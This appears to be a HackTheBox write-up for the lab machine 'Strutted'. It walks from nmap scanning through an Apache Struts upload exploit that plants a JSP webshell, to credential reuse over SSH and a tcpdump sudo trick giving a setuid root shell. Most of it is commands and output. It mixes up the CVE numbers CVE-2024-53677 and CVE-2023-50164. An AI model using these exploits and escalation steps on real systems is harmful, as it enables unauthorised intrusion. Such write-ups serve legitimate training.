---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - CVE-2023-50164
  - Apache-Struts
  - tcpdump
---
# Overview

| Name        | Strutted    |
| ----------- | ----------- |
| OS          | Linux       |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
❯ sudo nmap -sC -sV -A 10.10.11.59
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 08:42 +0545
Nmap scan report for 10.10.11.59
Host is up (0.44s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   472.31 ms 10.10.14.1
2   472.48 ms 10.10.11.59

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.01 seconds

❯ hostfile --linux 10.10.11.59 strutted.htb
Added to /etc/hosts:
   10.10.11.59 strutted.htb
```

![[strutted.png]]

Examine the downloaded `.zip` file.
# Enumeration

```bash
❯ ls
context.xml  README.md  tomcat-users.xml
Dockerfile   strutted

❯ cat tomcat-users.xml
<?xml version='1.0' encoding='utf-8'?>

<tomcat-users>
    <role rolename="manager-gui"/>
    <role rolename="admin-gui"/>
    <user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/>
</tomcat-users>
```

We got creds. We get version in `pom.xml`

```bash
❯ cat pom.xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <packaging>war</packaging>

    <artifactId>strutted</artifactId>
    <groupId>org.strutted.htb</groupId>
    <version>1.0.0</version>

    <name>Strutted™</name>
    <description>Instantly upload an image and receive a unique, shareable link. Keep your images secure, accessible, and easy to share—anywhere, anytime.</description>

    <properties>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <maven.compiler.source>17</maven.compiler.source>
        <maven.compiler.target>17</maven.compiler.target>
        <struts2.version>6.3.0.1</struts2.version>
<SNIP>
```

It's `6.3.0.1`. It is vulnerable to [CVE-2024-53677](https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE). A kind old vulnerability that effect `Apache Struts` leading to LFI, and remote execution.  
# Exploitation
## CVE-2023-50164

```bash
❯ git clone https://github.com/EQSTLab/CVE-2024-53677.git
Cloning into 'CVE-2024-53677'...
remote: Enumerating objects: 42, done.
remote: Counting objects: 100% (42/42), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 42 (delta 6), reused 34 (delta 2), pack-reused 0 (from 0)
Receiving objects: 100% (42/42), 25.03 KiB | 235.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.

❯ cd CVE-2024-53677

❯ ls
CVE-2024-53677.py  docker  README.md  requirements.txt  test.txt


```

```bash
┌──(kali㉿kali)-[~/htb/Machines/Strutted]
└─$ git clone https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE.git 

Cloning into 'CVE-2023-50164-Apache-Struts-RCE'...
remote: Enumerating objects: 65, done.
remote: Counting objects: 100% (65/65), done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 65 (delta 11), reused 52 (delta 7), pack-reused 0 (from 0)
Receiving objects: 100% (65/65), 25.20 KiB | 1.94 MiB/s, done.
Resolving deltas: 100% (11/11), done.
                                                                                                                    
┌──(kali㉿kali)-[~/htb/Machines/Strutted]
└─$ ls
context.xml                       Dockerfile  reports   strutted.zip  tomcat-users.xml
CVE-2023-50164-Apache-Struts-RCE  README.md   strutted  test.gif
                                                                                                                    
┌──(kali㉿kali)-[~/htb/Machines/Strutted]
└─$ cd CVE-2023-50164-Apache-Struts-RCE

┌──(struts)─(kali㉿kali)-[~/htb/Machines/Strutted]
└─$ cd CVE-2023-50164-Apache-Struts-RCE/exploit

python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

```bash
❯ python3 exploit.py --url http://strutted.htb/upload.action
[+] Starting exploitation...
[+] WAR file already exists.
[+] webshell.war uploaded successfully.
[+] Reach the JSP webshell at http://strutted.htb/webshell/webshell.jsp?cmd=<COMMAND>
[+] Attempting a connection with webshell.
[+] Successfully connected to the web shell.
CMD > whoami
tomcat
```

```bash
CMD > pwd
/var/lib/tomcat9
CMD > ls /etc/tomcat9
Catalina
catalina.properties
context.xml
jaspic-providers.xml
logging.properties
policy.d
server.xml
tomcat-users.xml
web.xml
CMD > cat /etc/tomcat9/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at      http://www.apache.org/licenses/LICENSE-2.0  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->
<!--
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <role rolename="manager-gui"/>
  <role rolename="admin-gui"/>
  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
--->
<!--
  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
</tomcat-users>
```

We get `admin:IT14d6SSP81k`.

```bash
CMD > ls /home
james
```

Since only user is `james` tried above password with it in SSH and worked.

```bash

❯ ssh james@strutted.htb
The authenticity of host 'strutted.htb (10.10.11.59)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'strutted.htb' (ED25519) to the list of known hosts.
james@strutted.htb's password:

james@strutted:~$ cat user.txt
fecb6a8f1e9a1730951e52c4b95aa307
```
# Privilege Escalation
## tcpdump

```bash
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

We can use [GTFOBins](https://gtfobins.github.io/gtfobins/tcpdump/?source=post_page-----31bd09097eb0---------------------------------------#sudo)

```bash
james@strutted:~$ COMMAND='cp /bin/bash /tmp/bash && chmod +s /tmp/bash'
james@strutted:~$ TF=$(mktemp)
james@strutted:~$ echo "$COMMAND" > $TF
james@strutted:~$ chmod +x $TF
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
james@strutted:~$ /tmp/bash -p
bash-5.1# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),27(sudo),1000(james)
bash-5.1# cat /root/root.txt
1aa272e845f1e11b5a45225884552a3a
```

---